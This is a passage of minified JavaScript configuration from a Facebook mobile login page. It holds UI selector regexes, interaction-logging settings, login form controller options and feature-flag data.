                    "ReactComposerSproutLiveVideo": " _5tv7(?: .*)?$",
                    "ReactComposerSproutMarkdown": " _311p(?: .*)?$",
                    "ReactComposerSproutFormattedText": " _mwg(?: .*)?$",
                    "ReactComposerSproutSticker": " _2vri(?: .*)?$",
                    "ReactComposerSproutSponsor": " _5t5q(?: .*)?$",
                    "ReactComposerSproutEllipsis": " _1gr3(?: .*)?$",
                    "ReactComposerSproutContactYourRepresentative": " _3cnv(?: .*)?$",
                    "ReactComposerSproutFunFact": " _2_xs(?: .*)?$",
                    "TextExposeSeeMoreLink": " see_more_link(?: .*)?$",
                    "SnowliftBigCloseButton": "(?: _xlt(?: .*)? _418x(?: .*)?$| _418x(?: .*)? _xlt(?: .*)?$)",
                    "SnowliftPrevPager": "(?: snowliftPager(?: .*)? prev(?: .*)?$| prev(?: .*)? snowliftPager(?: .*)?$)",
                    "SnowliftNextPager": "(?: snowliftPager(?: .*)? next(?: .*)?$| next(?: .*)? snowliftPager(?: .*)?$)",
                    "SnowliftFullScreenButton": "#fbPhotoSnowliftFullScreenSwitch( .+)*",
                    "PrivacySelectorMenu": "(?: _57di(?: .*)? _2wli(?: .*)?$| _2wli(?: .*)? _57di(?: .*)?$)",
                    "ReactComposerFeedXSprouts": " _nh6(?: .*)?$",
                    "SproutsComposerStatusTab": " _sg1(?: .*)?$",
                    "SproutsComposerLiveVideoTab": " _sg1(?: .*)?$",
                    "SproutsComposerAlbumTab": " _sg1(?: .*)?$",
                    "composerAudienceSelector": " _ej0(?: .*)?$",
                    "FeedHScrollAttachmentsPrevPager": " _1qqy(?: .*)?$",
                    "FeedHScrollAttachmentsNextPager": " _1qqz(?: .*)?$",
                    "DockChatTabFlyout": " fbDockChatTabFlyout(?: .*)?$",
                    "PrivacyLiteJewel": " _59fc(?: .*)?$",
                    "ActorSelector": " _6vh(?: .*)?$",
                    "LegacyMentionsInput": "(?: ReactLegacyMentionsInput(?: .*)? uiMentionsInput(?: .*)? _2xwx(?: .*)?$| uiMentionsInput(?: .*)? ReactLegacyMentionsInput(?: .*)? _2xwx(?: .*)?$| _2xwx(?: .*)? ReactLegacyMentionsInput(?: .*)? uiMentionsInput(?: .*)?$| ReactLegacyMentionsInput(?: .*)? _2xwx(?: .*)? uiMentionsInput(?: .*)?$| uiMentionsInput(?: .*)? _2xwx(?: .*)? ReactLegacyMentionsInput(?: .*)?$| _2xwx(?: .*)? uiMentionsInput(?: .*)? ReactLegacyMentionsInput(?: .*)?$)",
                    "UFIActionLinksEmbedLink": " _2g1w(?: .*)?$",
                    "UFIPhotoAttachLink": " UFIPhotoAttachLinkWrapper(?: .*)?$",
                    "UFIMentionsInputProxy": " _1osa(?: .*)?$",
                    "UFIMentionsInputDummy": " _1osc(?: .*)?$",
                    "UFIOrderingModeSelector": " _3scp(?: .*)?$",
                    "UFIPager": "(?: UFIPagerRow(?: .*)? UFIRow(?: .*)?$| UFIRow(?: .*)? UFIPagerRow(?: .*)?$)",
                    "UFIReplyRow": "(?: UFIReplyRow(?: .*)? UFICommentReply(?: .*)?$| UFICommentReply(?: .*)? UFIReplyRow(?: .*)?$)",
                    "UFIReplySocialSentence": " UFIReplySocialSentenceRow(?: .*)?$",
                    "UFIShareLink": " _5f9b(?: .*)?$",
                    "UFIStickerButton": " UFICommentStickerButton(?: .*)?$",
                    "MentionsInput": " _5yk1(?: .*)?$",
                    "FantaChatTabRoot": " _3_9e(?: .*)?$",
                    "SnowliftViewableRoot": " _2-sx(?: .*)?$",
                    "ReactBlueBarJewelButton": " _5fwr(?: .*)?$",
                    "UFIReactionsDialogLayerImpl": " _1oxk(?: .*)?$",
                    "UFIReactionsLikeLinkImpl": " _4x9_(?: .*)?$",
                    "UFIReactionsLinkImplRoot": " _khz(?: .*)?$",
                    "Reaction": " _iuw(?: .*)?$",
                    "UFIReactionsMenuImpl": " _iu-(?: .*)?$",
                    "UFIReactionsSpatialReactionIconContainer": " _1fq9(?: .*)?$",
                    "VideoComponentPlayButton": " _bsl(?: .*)?$",
                    "FeedOptionsPopover": " _b1e(?: .*)?$",
                    "UFICommentLikeCount": " UFICommentLikeButton(?: .*)?$",
                    "UFICommentLink": " _5yxe(?: .*)?$",
                    "ChatTabComposerInputContainer": " _552h(?: .*)?$",
                    "ChatTabHeader": " _15p4(?: .*)?$",
                    "DraftEditor": " _5rp7(?: .*)?$",
                    "ChatSideBarDropDown": " _5vm9(?: .*)?$",
                    "SearchBox": " _539-(?: .*)?$",
                    "ChatSideBarLink": " _55ln(?: .*)?$",
                    "MessengerSearchTypeahead": " _3rh8(?: .*)?$",
                    "NotificationListItem": " _33c(?: .*)?$",
                    "MessageJewelListItem": " messagesContent(?: .*)?$",
                    "Messages_Jewel_Button": " _3eo8(?: .*)?$",
                    "Notifications_Jewel_Button": " _3eo9(?: .*)?$",
                    "snowliftopen": " _342u(?: .*)?$",
                    "NoteTextSeeMoreLink": " _3qd_(?: .*)?$",
                    "fbFeedOptionsPopover": " _1he6(?: .*)?$",
                    "Requests_Jewel_Button": " _3eoa(?: .*)?$",
                    "UFICommentActionLinkAjaxify": " _15-3(?: .*)?$",
                    "UFICommentActionLinkRedirect": " _15-6(?: .*)?$",
                    "UFICommentActionLinkDispatched": " _15-7(?: .*)?$",
                    "UFICommentCloseButton": " _36rj(?: .*)?$",
                    "UFICommentActionsRemovePreview": " _460h(?: .*)?$",
                    "UFICommentActionsReply": " _460i(?: .*)?$",
                    "UFICommentActionsSaleItemMessage": " _460j(?: .*)?$",
                    "UFICommentActionsAcceptAnswer": " _460k(?: .*)?$",
                    "UFICommentActionsUnacceptAnswer": " _460l(?: .*)?$",
                    "UFICommentReactionsLikeLink": " _3-me(?: .*)?$",
                    "UFICommentMenu": " _1-be(?: .*)?$",
                    "UFIMentionsInputFallback": " _289b(?: .*)?$",
                    "UFIMentionsInputComponent": " _289c(?: .*)?$",
                    "UFIMentionsInputProxyInput": " _432z(?: .*)?$",
                    "UFIMentionsInputProxyDummy": " _432-(?: .*)?$",
                    "UFIPrivateReplyLinkMessage": " _14hj(?: .*)?$",
                    "UFIPrivateReplyLinkSeeReply": " _14hk(?: .*)?$",
                    "ChatCloseButton": " _4vu4(?: .*)?$",
                    "ChatTabComposerPhotoUploader": " _13f-(?: .*)?$",
                    "ChatTabComposerGroupPollingButton": " _13f_(?: .*)?$",
                    "ChatTabComposerGames": " _13ga(?: .*)?$",
                    "ChatTabComposerPlan": " _13gb(?: .*)?$",
                    "ChatTabComposerFileUploader": " _13gd(?: .*)?$",
                    "ChatTabStickersButton": " _13ge(?: .*)?$",
                    "ChatTabComposerGifButton": " _13gf(?: .*)?$",
                    "ChatTabComposerEmojiPicker": " _13gg(?: .*)?$",
                    "ChatTabComposerLikeButton": " _13gi(?: .*)?$",
                    "ChatTabComposerP2PButton": " _13gj(?: .*)?$",
                    "ChatTabComposerQuickCam": " _13gk(?: .*)?$",
                    "ChatTabHeaderAudioRTCButton": " _461a(?: .*)?$",
                    "ChatTabHeaderVideoRTCButton": " _461b(?: .*)?$",
                    "ChatTabHeaderOptionsButton": " _461_(?: .*)?$",
                    "ChatTabHeaderAddToThreadButton": " _4620(?: .*)?$",
                    "ReactComposerMediaSprout": " _fk5(?: .*)?$",
                    "UFIReactionsBlingSocialSentenceComments": " _-56(?: .*)?$",
                    "UFIReactionsBlingSocialSentenceSeens": " _2x0l(?: .*)?$",
                    "UFIReactionsBlingSocialSentenceShares": " _2x0m(?: .*)?$",
                    "UFIReactionsBlingSocialSentenceViews": " _-5c(?: .*)?$",
                    "UFIReactionsBlingSocialSentence": " _-5d(?: .*)?$",
                    "UFIReactionsSocialSentence": " _1vaq(?: .*)?$",
                    "VideoFullscreenButton": " _39ip(?: .*)?$",
                    "Tahoe": " _400z(?: .*)?$",
                    "TahoeFromVideoPlayer": " _1vek(?: .*)?$",
                    "TahoeFromVideoLink": " _2-40(?: .*)?$",
                    "TahoeFromPhoto": " _2ju5(?: .*)?$",
                    "FBStoryTrayItem": " _1fvw(?: .*)?$",
                    "Mobile_Feed_Jewel_Button": "#feed_jewel( .+)*",
                    "Mobile_Requests_Jewel_Button": "#requests_jewel( .+)*",
                    "Mobile_Messages_Jewel_Button": "#messages_jewel( .+)*",
                    "Mobile_Notifications_Jewel_Button": "#notifications_jewel( .+)*",
                    "Mobile_Search_Jewel_Button": "#search_jewel( .+)*",
                    "Mobile_Bookmarks_Jewel_Button": "#bookmarks_jewel( .+)*",
                    "Mobile_Feed_UFI_Comment_Button_Permalink": " _l-a(?: .*)?$",
                    "Mobile_Feed_UFI_Comment_Button_Flyout": " _4qeq(?: .*)?$",
                    "Mobile_Feed_UFI_Token_Bar_Flyout": " _4qer(?: .*)?$",
                    "Mobile_Feed_UFI_Token_Bar_Permalink": " _4-09(?: .*)?$",
                    "Mobile_UFI_Share_Button": " _15kr(?: .*)?$",
                    "Mobile_Feed_Photo_Permalink": " _1mh-(?: .*)?$",
                    "Mobile_Feed_Video_Permalink": " _65g_(?: .*)?$",
                    "Mobile_Feed_Profile_Permalink": " _4kk6(?: .*)?$",
                    "Mobile_Feed_Story_Permalink": " _26yo(?: .*)?$",
                    "Mobile_Feed_Page_Permalink": " _4e81(?: .*)?$",
                    "Mobile_Feed_Group_Permalink": " _20u1(?: .*)?$",
                    "Mobile_Feed_Event_Permalink": " _20u0(?: .*)?$",
                    "ProfileIntroCardAddFeaturedMedia": " _30qr(?: .*)?$",
                    "ProfileSectionAbout": " _Interaction__ProfileSectionAbout(?: .*)?$",
                    "ProfileSectionAllRelationships": " _Interaction__ProfileSectionAllRelationships(?: .*)?$",
                    "ProfileSectionAtWork": " _2fnv(?: .*)?$",
                    "ProfileSectionContactBasic": " _Interaction__ProfileSectionContactBasic(?: .*)?$",
                    "ProfileSectionEducation": " _Interaction__ProfileSectionEducation(?: .*)?$",
                    "ProfileSectionOverview": " _Interaction__ProfileSectionOverview(?: .*)?$",
                    "ProfileSectionPlaces": " _Interaction__ProfileSectionPlaces(?: .*)?$",
                    "ProfileSectionYearOverviews": " _Interaction__ProfileSectionYearOverviews(?: .*)?$",
                    "IntlPolyglotHomepage": " _Interaction__IntlPolyglotVoteActivityCardButton(?: .*)?$",
                    "ProtonElementSelection": " _67ft(?: .*)?$"
                },
                "interaction_boost": {
                    "SnowliftPrevPager": 0.2,
                    "SnowliftNextPager": 0.2,
                    "ChatSideBarLink": 2,
                    "MessengerSearchTypeahead": 2,
                    "Messages_Jewel_Button": 2.5,
                    "Notifications_Jewel_Button": 1.5,
                    "Tahoe": 30,
                    "ProtonElementSelection": 4
                },
                "event_types": {
                    "BlueBarAccountChevronMenu": ["click"],
                    "BlueBarHomeButton": ["click"],
                    "BlueBarProfileLink": ["click"],
                    "ReactComposerSproutMedia": ["click"],
                    "ReactComposerSproutAlbum": ["click"],
                    "ReactComposerSproutNote": ["click"],
                    "ReactComposerSproutLocation": ["click"],
                    "ReactComposerSproutActivity": ["click"],
                    "ReactComposerSproutPeople": ["click"],
                    "ReactComposerSproutLiveVideo": ["click"],
                    "ReactComposerSproutMarkdown": ["click"],
                    "ReactComposerSproutFormattedText": ["click"],
                    "ReactComposerSproutSticker": ["click"],
                    "ReactComposerSproutSponsor": ["click"],
                    "ReactComposerSproutEllipsis": ["click"],
                    "ReactComposerSproutContactYourRepresentative": ["click"],
                    "ReactComposerSproutFunFact": ["click"],
                    "TextExposeSeeMoreLink": ["click"],
                    "SnowliftBigCloseButton": ["click"],
                    "SnowliftPrevPager": ["click"],
                    "SnowliftNextPager": ["click"],
                    "SnowliftFullScreenButton": ["click"],
                    "PrivacySelectorMenu": ["click"],
                    "ReactComposerFeedXSprouts": ["click"],
                    "SproutsComposerStatusTab": ["click"],
                    "SproutsComposerLiveVideoTab": ["click"],
                    "SproutsComposerAlbumTab": ["click"],
                    "composerAudienceSelector": ["click"],
                    "FeedHScrollAttachmentsPrevPager": ["click"],
                    "FeedHScrollAttachmentsNextPager": ["click"],
                    "DockChatTabFlyout": ["click"],
                    "PrivacyLiteJewel": ["click"],
                    "ActorSelector": ["click"],
                    "LegacyMentionsInput": ["click"],
                    "UFIActionLinksEmbedLink": ["click"],
                    "UFIPhotoAttachLink": ["click"],
                    "UFIMentionsInputProxy": ["click"],
                    "UFIMentionsInputDummy": ["click"],
                    "UFIOrderingModeSelector": ["click"],
                    "UFIPager": ["click"],
                    "UFIReplyRow": ["click"],
                    "UFIReplySocialSentence": ["click"],
                    "UFIShareLink": ["click"],
                    "UFIStickerButton": ["click"],
                    "MentionsInput": ["click"],
                    "FantaChatTabRoot": ["click"],
                    "SnowliftViewableRoot": ["click"],
                    "ReactBlueBarJewelButton": ["click"],
                    "UFIReactionsDialogLayerImpl": ["click"],
                    "UFIReactionsLikeLinkImpl": ["click"],
                    "UFIReactionsLinkImplRoot": ["click"],
                    "Reaction": ["click"],
                    "UFIReactionsMenuImpl": ["click"],
                    "UFIReactionsSpatialReactionIconContainer": ["click"],
                    "VideoComponentPlayButton": ["click"],
                    "FeedOptionsPopover": ["click"],
                    "UFICommentLikeCount": ["click"],
                    "UFICommentLink": ["click"],
                    "ChatTabComposerInputContainer": ["click"],
                    "ChatTabHeader": ["click"],
                    "DraftEditor": ["click"],
                    "ChatSideBarDropDown": ["click"],
                    "SearchBox": ["click"],
                    "ChatSideBarLink": ["mouseup"],
                    "MessengerSearchTypeahead": ["click"],
                    "NotificationListItem": ["click"],
                    "MessageJewelListItem": ["click"],
                    "Messages_Jewel_Button": ["click"],
                    "Notifications_Jewel_Button": ["click"],
                    "snowliftopen": ["click"],
                    "NoteTextSeeMoreLink": ["click"],
                    "fbFeedOptionsPopover": ["click"],
                    "Requests_Jewel_Button": ["click"],
                    "UFICommentActionLinkAjaxify": ["click"],
                    "UFICommentActionLinkRedirect": ["click"],
                    "UFICommentActionLinkDispatched": ["click"],
                    "UFICommentCloseButton": ["click"],
                    "UFICommentActionsRemovePreview": ["click"],
                    "UFICommentActionsReply": ["click"],
                    "UFICommentActionsSaleItemMessage": ["click"],
                    "UFICommentActionsAcceptAnswer": ["click"],
                    "UFICommentActionsUnacceptAnswer": ["click"],
                    "UFICommentReactionsLikeLink": ["click"],
                    "UFICommentMenu": ["click"],
                    "UFIMentionsInputFallback": ["click"],
                    "UFIMentionsInputComponent": ["click"],
                    "UFIMentionsInputProxyInput": ["click"],
                    "UFIMentionsInputProxyDummy": ["click"],
                    "UFIPrivateReplyLinkMessage": ["click"],
                    "UFIPrivateReplyLinkSeeReply": ["click"],
                    "ChatCloseButton": ["click"],
                    "ChatTabComposerPhotoUploader": ["click"],
                    "ChatTabComposerGroupPollingButton": ["click"],
                    "ChatTabComposerGames": ["click"],
                    "ChatTabComposerPlan": ["click"],
                    "ChatTabComposerFileUploader": ["click"],
                    "ChatTabStickersButton": ["click"],
                    "ChatTabComposerGifButton": ["click"],
                    "ChatTabComposerEmojiPicker": ["click"],
                    "ChatTabComposerLikeButton": ["click"],
                    "ChatTabComposerP2PButton": ["click"],
                    "ChatTabComposerQuickCam": ["click"],
                    "ChatTabHeaderAudioRTCButton": ["click"],
                    "ChatTabHeaderVideoRTCButton": ["click"],
                    "ChatTabHeaderOptionsButton": ["click"],
                    "ChatTabHeaderAddToThreadButton": ["click"],
                    "ReactComposerMediaSprout": ["click"],
                    "UFIReactionsBlingSocialSentenceComments": ["click"],
                    "UFIReactionsBlingSocialSentenceSeens": ["click"],
                    "UFIReactionsBlingSocialSentenceShares": ["click"],
                    "UFIReactionsBlingSocialSentenceViews": ["click"],
                    "UFIReactionsBlingSocialSentence": ["click"],
                    "UFIReactionsSocialSentence": ["click"],
                    "VideoFullscreenButton": ["click"],
                    "Tahoe": ["click"],
                    "TahoeFromVideoPlayer": ["click"],
                    "TahoeFromVideoLink": ["click"],
                    "TahoeFromPhoto": ["click"],
                    "": ["click"],
                    "FBStoryTrayItem": ["click"],
                    "Mobile_Feed_Jewel_Button": ["click"],
                    "Mobile_Requests_Jewel_Button": ["click"],
                    "Mobile_Messages_Jewel_Button": ["click"],
                    "Mobile_Notifications_Jewel_Button": ["click"],
                    "Mobile_Search_Jewel_Button": ["click"],
                    "Mobile_Bookmarks_Jewel_Button": ["click"],
                    "Mobile_Feed_UFI_Comment_Button_Permalink": ["click"],
                    "Mobile_Feed_UFI_Comment_Button_Flyout": ["click"],
                    "Mobile_Feed_UFI_Token_Bar_Flyout": ["click"],
                    "Mobile_Feed_UFI_Token_Bar_Permalink": ["click"],
                    "Mobile_UFI_Share_Button": ["click"],
                    "Mobile_Feed_Photo_Permalink": ["click"],
                    "Mobile_Feed_Video_Permalink": ["click"],
                    "Mobile_Feed_Profile_Permalink": ["click"],
                    "Mobile_Feed_Story_Permalink": ["click"],
                    "Mobile_Feed_Page_Permalink": ["click"],
                    "Mobile_Feed_Group_Permalink": ["click"],
                    "Mobile_Feed_Event_Permalink": ["click"],
                    "ProfileIntroCardAddFeaturedMedia": ["click"],
                    "ProfileSectionAbout": ["click"],
                    "ProfileSectionAllRelationships": ["click"],
                    "ProfileSectionAtWork": ["click"],
                    "ProfileSectionContactBasic": ["click"],
                    "ProfileSectionEducation": ["click"],
                    "ProfileSectionOverview": ["click"],
                    "ProfileSectionPlaces": ["click"],
                    "ProfileSectionYearOverviews": ["click"],
                    "IntlPolyglotHomepage": ["click"],
                    "ProtonElementSelection": ["click"]
                },
                "manual_instrumentation": false,
                "profile_eager_execution": true,
                "disable_heuristic": true,
                "disable_event_profiler": false
            }, 1726],
            ["KillabyteProfilerConfig", [], {
                "htmlProfilerModule": null,
                "profilerModule": null,
                "depTypes": {
                    "BL": "bl",
                    "NON_BL": "non-bl"
                }
            }, 1145],
            ["QuicklingConfig", [], {
                "version": "4274249;0;",
                "sessionLength": 30,
                "inactivePageRegex": "^\/(fr\/u\\.php|ads\/|advertising|ac\\.php|ae\\.php|a\\.php|ajax\/emu\/(end|f|h)\\.php|badges\/|comments\\.php|connect\/uiserver\\.php|editalbum\\.php.+add=1|ext\/|feeds\/|help([\/?]|$)|identity_switch\\.php|isconnectivityahumanright\/|intern\/|login\\.php|logout\\.php|sitetour\/homepage_tour\\.php|sorry\\.php|syndication\\.php|webmessenger|\/plugins\/subscribe|lookback|brandpermissions|gameday|pxlcld|comet|worldcup\/map|livemap|work\/admin|([^\/]+\/)?dialog)|legal|\\.pdf$",
                "badRequestKeys": ["nonce", "access_token", "oauth_token", "xs", "checkpoint_data", "code"],
                "logRefreshOverhead": false
            }, 60],
            ["ImmediateActiveSecondsConfig", [], {
                "sampling_rate": 0
            }, 423],
            ["DirectDownloadEvents", [], {
                "downloadFb4aViaShimClick": "download_fb4a_via_shim_click",
                "upgrade_page_imp": "upgrade_page_imp",
                "upgrade_button_click": "upgrade_button_click",
                "sideload_installer_as_preloads": "sideload_installer_as_preloads",
                "try_open_appmanager_deep_link_web_install": "try_open_appmanager_deep_link_web_install",
                "logged_out_banner_google_play_redirect_failed": "logged_out_banner_google_play_redirect_failed",
                "logged_out_banner_impression_client": "logged_out_banner_impression_client"
            }, 2368],
            ["MBanzaiConfig", [], {
                "EXPIRY": 86400000,
                "MAX_SIZE": 10000,
                "MAX_WAIT": 30000,
                "RESTORE_WAIT": 30000,
                "gks": {
                    "boosted_component": true,
                    "mchannel_jumpstart": true,
                    "platform_oauth_client_events": true,
                    "visibility_tracking": true,
                    "xtrackable_clientview_batch": true,
                    "boosted_pagelikes": true,
                    "gqls_web_logging": true,
                    "mtouch_bit_array_use_banzai": true
                },
                "blacklist": ["time_spent"]
            }, 32],
            ["MSession", [], {
                "useAngora": false,
                "logoutURL": "\/logout.php?h=AffRwhU1kmcIOHuC&t=1535984443",
                "push_phase": "C3"
            }, 52]
        ]);
        new(require("ServerJS"))().handle({});
    }, "ServerJS define", {
        "root": true
    })();
    require("MCoreInit").init({
        "clearMCache": false,
        "deferredResources": ["DofZb", "Biicz", "DC0fA", "dHW6g", "FEt5G"],
        "hideLocationBar": true,
        "onafterload": "window.CavalryLogger&&CavalryLogger.getInstance().setTimeStamp(\"t_paint\");;if (window.ExitTime){CavalryLogger.getInstance(\"6597002951490280825-0\").setValue(\"t_exit\", window.ExitTime);};",
        "onload": "CavalryLogger.getInstance(\"6597002951490280825-0\").setTTIEvent(\"t_domcontent\");",
        "serverJSData": {
            "instances": [
                ["__inst_dfbc3ade_0_0", ["MLoggedOutBannerGooglePlayRedirectWithFallback", "__elem_729c1b93_0_0"],
                    [{
                        "button": {
                            "__m": "__elem_729c1b93_0_0"
                        },
                        "native_app_url": "https:\/\/m.facebook.com\/click.php?redir_url=market\u00253A\u00252F\u00252Fdetails\u00253Fid\u00253Dcom.facebook.katana\u002526referrer\u00253Dutm_reg\u0025253Dfb7EWuw-D-1ght5KpprnFPM8\u002526referrer_params\u0025255Blink_source\u0025255D\u00253Dfb_app_banner&app_id=350685531728&cref=mb&no_fw=1",
                        "fallback_url": "https:\/\/m.facebook.com\/click.php?redir_url=market\u00253A\u00252F\u00252Fdetails\u00253Fid\u00253Dcom.facebook.katana\u002526referrer\u00253Dutm_reg\u0025253Dfb7EWuw-D-1ght5KpprnFPM8\u002526referrer_params\u0025255Blink_source\u0025255D\u00253Dfb_app_banner&app_id=350685531728&cref=mb&no_fw=1",
                        "logging_data": {
                            "app_referrer": "logged_out_banner",
                            "app": "350685531728",
                            "country": "BR"
                        }
                    }], 1
                ]
            ],
            "elements": [
                ["__elem_de5177dd_0_0", "u_0_0", 1],
                ["__elem_729c1b93_0_0", "u_0_1", 1],
               ["__elem_e24cb174_0_0", "m_login_password", 1],
                ["__elem_7216e2ae_0_2", "u_0_2", 1],
                ["__elem_e03291d5_0_1", "u_0_3", 1],
                ["__elem_e03291d5_0_0", "u_0_4", 1],
                ["__elem_2df5b073_0_0", "did-you-forget-your-password-link", 1],
                ["__elem_7216e2ae_0_0", "u_0_5", 1],
                ["__elem_be66b106_0_0", "u_0_6", 1],
                ["__elem_7216e2ae_0_1", "u_0_7", 1],
                ["__elem_e980dec4_0_0", "signup-button", 1],
                ["__elem_49f6b607_0_0", "root", 1],
                ["__elem_eed16c0a_0_0", "u_0_8", 1],
                ["__elem_a588f507_0_0", "u_0_9", 1],
                ["__elem_a588f507_0_1", "u_0_a", 1],
                ["__elem_0cdc66ad_0_0", "u_0_c", 1],
                ["__elem_0cdc66ad_0_1", "u_0_d", 1]
            ],
            "require": [
                ["BrowserPrefillLogging", "initContactpointFieldLogging", [],
                    [{
                        "contactpointFieldID": "m_login_email",
                        "serverPrefill": ""
                    }]
                ],
                ["MLoginController", "initIncorrectPWErrorMsgLink", ["__elem_2df5b073_0_0"],
                    [{
                        "root": {
                            "__m": "__elem_2df5b073_0_0"
                        }
                    }]
                ],
                ["BrowserPrefillLogging", "initPasswordFieldLogging", [],
                    [{
                        "passwordFieldID": "m_login_password"
                    }]
                ],
                ["MLoginView", "disableOnSubmit", ["__elem_921b58ef_0_0", "__elem_7216e2ae_0_0"],
                    [{
                        "__m": "__elem_921b58ef_0_0"
                    }, {
                        "__m": "__elem_7216e2ae_0_0"
                    }]
                ],
                ["MLoginController", "initRegButton", ["__elem_7216e2ae_0_1"],
                    [{
                        "root": {
                            "__m": "__elem_7216e2ae_0_1"
                        },
                        "regURI": "\/reg\/?cid=103",
                        "useRegToLogin": true
                    }]
                ],
                ["MLoginController", "initLoginForm", ["__elem_de5177dd_0_0"],
                    [{
                        "root": {
                            "__m": "__elem_de5177dd_0_0"
                        },
                        "ajaxURI": "https:\/\/m.facebook.com\/login\/async\/?refsrc=https\u00253A\u00252F\u00252Fpt-br.facebook.com\u00252F&lwv=100",
                        "rapidFeedbackUri": null,
                        "clearOnDelete": false,
                        "listenKeyDown": false,
                        "isTwoStepsLogin": false,
                        "passwordStepDelayMilliSeconds": 1000,
                        "isActionLoggingEnabled": true,
                        "isEarlyCPCheckEnabled": false,
                        "onErrorRegURI": "\/r.php",
                        "shouldNotAutoFocusPasswordField": false,
                        "shouldAutoLandOnStep2": false,
                        "shouldClearPasswordIfPrefilledCPChanged": true,
                        "shouldEnableOneStepLoginForPrefill": false,
                        "shouldAutoSubmitWhenPrefilledStep1": false,
                        "shouldAutoSubmitWhenPrefilledStep2": false,
                        "shouldEnableOneStepLoginOnStepTwo": false,
                        "shouldClearPasswordIfOnlyPasswordPrefilled": true,
                        "shouldRenderBoxedProfilePicDesign": true,
                        "shouldShowProfilePicWithCP": false,
                        "shouldEnableOneTimePassword": true,
                        "shouldEnableScrollToError": false,
                        "shouldEnableInlineError": false,
                        "shouldEnableEditableCPDesign": true,
                        "shouldCallServerOnEmptyCP": false,
                        "isWithSafariFix": true,
                        "shouldEnableOTPWithoutRedirection": false,
                        "shouldPrefillHeaderJio": false,
                        "shouldProcessUserConsentForTokenHeader": false,
                        "shouldShowBlankCPPWErrorMsgWithLink": false,
                        "shouldShowBlankCPPWErrorMsgNoLink": false,
                        "shouldShowBlankPWValidCPErrorMsg": false,
                        "shouldShowBlankPWValidCPErrorMsgNonAccurateExposure": false,
                        "shouldSeparateIncorrectPWCTAFromErrorMSG": false
                    }]
                ],
                ["__inst_dfbc3ade_0_0"],
                ["MTouchable"],
                ["MPasswordPlainTextToggle", "init", ["__elem_e24cb174_0_0", "__elem_7216e2ae_0_2", "__elem_e03291d5_0_0", "__elem_e03291d5_0_1"],
                    [{
                        "__m": "__elem_e24cb174_0_0"
                    }, {
                        "__m": "__elem_7216e2ae_0_2"
                    }, {
                        "__m": "__elem_e03291d5_0_0"
                    }, {
                        "__m": "__elem_e03291d5_0_1"
                    }]
                ],
                ["ServiceWorkerLoginAndLogoutListener", "listen", ["__elem_be66b106_0_0"],
                    [{
                        "__m": "__elem_be66b106_0_0"
                    }, "login", "\/sw?s=push", 612424062191227]
                ],
                ["MBlockingTouchable", "init", ["__elem_e980dec4_0_0"],
                    [{
                        "__m": "__elem_e980dec4_0_0"
                    }]
                ],
                ["AccessibilityWebVirtualCursorClickLogger", "init", ["__elem_49f6b607_0_0"],
                    [
                        [{
                            "__m": "__elem_49f6b607_0_0"
                        }]
                    ]
                ],
                ["MScrollPositionSaver"],
                ["MLogoutClearCache"],
                ["LoadingIndicator", "init", ["__elem_eed16c0a_0_0", "__elem_a588f507_0_0", "__elem_a588f507_0_1"],
                    [{
                        "__m": "__elem_eed16c0a_0_0"
                    }, {
                        "__m": "__elem_a588f507_0_0"
                    }, {
                        "__m": "__elem_a588f507_0_1"
                    }]
                ],
                ["MPageError"],
                ["MPageHeaderAccessibility"],
                ["MBlockingTouchable", "init", ["__elem_0cdc66ad_0_0"],
                    [{
                        "__m": "__elem_0cdc66ad_0_0"
                    }]
                ],
                ["MBlockingTouchable", "init", ["__elem_0cdc66ad_0_1"],
                    [{
                        "__m": "__elem_0cdc66ad_0_1"
                    }]
                ],
                ["MLoadingIndicator", "init", [],
                    ["u_0_b"]
                ],
                ["MPrelude"],
                ["CavalryLoggerImpl", "startInstrumentation", [],
                    []
                ],
                ["LogHistoryListeners"],
                ["Artillery"],
                ["ScriptPath", "set", [],
                    ["\/wap\/index.php", "0f4ef985", {
                        "imp_id": "0uMncrgPDZPWvmebK",
                        "ef_page": null
                    }]
                ],
                ["MLogging", "main", [],
                    [{
                        "refid": 8
                    }]
                ],
                ["RemoteDevice", "init", [],
                    []
                ],
                ["MModalDialogInit"],
                ["MVerifyCache", "main", [],
                    [{
                        "viewer": 0
                    }]
                ],
                ["EventProfiler"],
                ["ScriptPathLogger", "startLogging", [],
                    []
                ],
                ["MTimeSpentBitArrayLogger", "init", [],
                    ["m"]
                ],
                ["MCommentViewportTracking", "singleton", [],
                    [{
                        "enabled": true,
                        "debug_console": false,
                        "debug_html": false,
                        "idle_timeout": 5000,
                        "min_duration_to_log": 100,
                        "min_visible_size": 200
                    }]
                ],
                ["NavigationMetrics"],
                ["PerfXLogger"],
                ["ServiceWorkerURLCleaner", "removeRedirectID", [],
                    []
                ]
            ]
        },
        "isWildeWeb": false,
        "isFacewebAndroid": false,
        "ixData": {},
        "bxData": {},
        "gkxData": {
            "AT5tMpZqIKh0vdvJexCKKhPqDfMAWQPHLQnR8CgtajZUMLAZP8rj8YnSD9bEFc4BrmsaxTBmOCxn2mR6tM_ew1hH": {
                "result": false,
                "hash": "AT5nx6NL5m-VAtqr"
            },
            "AT7zMB0I7eORfH-UodO4y3BTPg5wOO8T247ZMNn2q5-aNcyAQUvzZrGn32ptMehFmO1oqnCJmh_zFD3-bdTI6XU3_0z7OLdKJrGgHtrOitBdeg": {
                "result": false,
                "hash": "AT7ZFqm3t0kQiXZJ"
            },
            "AT4miIiW4pJzE0dukYVRr93bo-U7aeRzegmes3xLz6J7QfAO9xBCVDCcWNxQBaSegngcbU8UJ8KqD-c2mDX0kNsMkP4Db418yITqzzh_hAbRIA": {
                "result": false,
                "hash": "AT5yVkEo9aslGp18"
            },
            "AT68bJwSI-83elN-7JSMMH9zt32KbiF6pW-XMlf6NViAJ3CbAk_16Vq8cK1tl1029_ApvFwINR8hmoci3nMKFTDhDCBp1wrvYQbOKq0pCjZpqA": {
                "result": false,
                "hash": "AT4s6h4eMZ6XFNay"
            },
            "AT6vIKc4yvpLzvCe00DDqmWnCcWW9gg6lvyzBsK0MPzrJqNmyZ-lzLSw8lY20YNrZBEF7JSPcBJS9N9bCmn1zMDUn2EIk_0tdJz3AHqh5jmikg": {
                "result": false,
                "hash": "AT4Uat26PXxs8vu6"
            },
            "AT5TADJ4IDqkBvMHj8JLNylXXgmWmvOXJO-tTCuV9i3mkXK-zBXm3JkLm3k6qxbTjLpJmVr_K5j2KZs32AccQJgX": {
                "result": false,
                "hash": "AT6yq4x6b1x5lDsS"
            },
